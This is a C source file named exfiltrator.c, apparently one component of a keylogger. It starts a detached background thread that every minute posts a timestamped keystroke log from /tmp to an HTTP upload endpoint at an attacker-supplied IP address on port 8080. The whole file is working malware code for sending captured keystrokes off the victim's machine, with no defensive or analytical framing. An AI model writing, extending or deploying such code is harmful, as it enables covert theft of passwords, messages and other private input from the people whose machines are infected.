// exfiltrator.c
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <curl/curl.h>
#include <stdio.h>
#include "../include/exfiltrator.h" // Ensure this path is correct

#define LOG_FILE "/tmp/keylog_timestamped.txt" // Log file to exfiltrate

void* upload_loop(void *arg) {
    const char *ip = (const char*)arg;
    char url[256];
    // This uses HTTP; for actual security, HTTPS and proper certificate handling are crucial.
    snprintf(url, sizeof(url), "http://%s:8080/upload", ip);

    while (1) {
        CURL *curl = curl_easy_init();
        if (curl) {
            curl_mime *form = curl_mime_init(curl);
            curl_mimepart *part = curl_mime_addpart(form);

            // Set the name of the form field (e.g., "file" on the server)
            curl_mime_name(part, "file");
            // Specify the file to upload
            curl_mime_filedata(part, LOG_FILE);

            // Set the URL for the upload
            curl_easy_setopt(curl, CURLOPT_URL, url);
            // Specify the MIME POST form
            curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

            // Perform the file upload
            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                // In a daemonized process, you wouldn't see this.
                // Consider logging to a dedicated error log file or syslog.
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            }

            // Clean up CURL resources
            curl_easy_cleanup(curl);
            curl_mime_free(form);
        }
        sleep(60);  // every 1 minute (corrected comment)
    }
    return NULL;
}

void start_exfiltration_thread(const char *ip) {
    static char ip_copy[128]; // Use static buffer to ensure it persists for the thread
    strncpy(ip_copy, ip, sizeof(ip_copy) - 1); // Corrected: -1 for null termination
    ip_copy[sizeof(ip_copy) - 1] = '\0'; // Ensure null termination

    pthread_t tid;
    // Create a new thread that runs the upload_loop function
    // The IP address is passed as an argument to the thread function
    pthread_create(&tid, NULL, upload_loop, ip_copy);
    pthread_detach(tid); // Detach the thread so its resources are automatically reclaimed
}
